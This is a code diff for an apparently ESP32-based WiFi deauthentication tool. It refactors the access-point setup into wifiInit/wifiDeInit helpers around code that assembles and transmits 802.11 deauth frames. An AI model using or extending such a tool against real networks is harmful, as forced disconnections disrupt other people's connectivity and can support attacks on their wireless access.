@@ -1,3 +1,5 @@
+#include "wifiInit.h"
+#include "frameContents.h"
 
 /*
     This declaration gives access to the esp_wifi_80211_tx function,
@@ -24,29 +26,6 @@ void deauther(){
         channel = getchar();
     }while(channel==-1);
 
-    // Set up the wifi for sending out frames
-    ESP_ERROR_CHECK(esp_netif_init());
-	ESP_ERROR_CHECK(esp_event_loop_create_default());
-	esp_netif_create_default_wifi_ap();
-    // Init dummy AP to specify a channel and get WiFi hardware into
-	// a mode where we can send the actual fake beacon frames.
-	ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-	wifi_config_t ap_config = {
-		.ap = {
-			.ssid = "a",
-			.ssid_len = 0,
-			.password = "password",
-			.channel = channel,
-			.authmode = WIFI_AUTH_WPA2_PSK,
-			.ssid_hidden = 1,
-			.max_connection = 4,
-			.beacon_interval = 100
-		}
-	};
-    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-	ESP_ERROR_CHECK(esp_wifi_start());
-	ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
-
     // Assemble the deauth frame
     frame = (uint8_t*)malloc(26);
     memcpy(frame, deauthFrame_p1, 10);
@@ -64,6 +43,7 @@ void deauther(){
 TaskHandle_t deautherTaskHandle;
 
 void runDeauther(){
+    wifiInit(true);
     xTaskCreate(deauther, "deauther", 4096, NULL, 5, &deautherTaskHandle);
     vTaskDelay(500 / portTICK_PERIOD_MS); // Wait for the task to start
     // Start checking for 'q' to stop the task (we can do this now because 500ms is long enough for the deauth task to have read everything it needs from the buffer)
@@ -72,4 +52,5 @@ void runDeauther(){
     }
     vTaskDelete(deautherTaskHandle);
     free(frame);
+    wifiDeInit();
 }
